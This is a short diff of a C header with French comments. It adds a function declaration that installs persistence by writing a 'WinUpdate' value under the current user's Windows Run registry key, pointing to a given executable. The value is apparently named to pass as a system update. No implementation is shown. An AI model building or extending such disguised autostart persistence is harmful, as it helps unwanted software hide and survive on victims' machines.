@@ -11,7 +11,16 @@
 #define PERSIST_VALUE_NAME "WinUpdate"
 
 /*
- * Installe la persistance :
+ * Installe la persistance en pointant vers exe_path :
+ *   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+ *   "WinUpdate" = exe_path
+ * Idempotent : la valeur est reecrite a chaque appel, sans doublon.
+ * Retourne 0 si succes, -1 sinon.
+ */
+int persist_install_path(const char *exe_path);
+
+/*
+ * Installe la persistance (variante historique) :
  *   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  *   "WinUpdate" = chemin de l'exe courant (GetModuleFileNameA)
  * Idempotent : la valeur est reecrite a chaque appel, sans doublon.
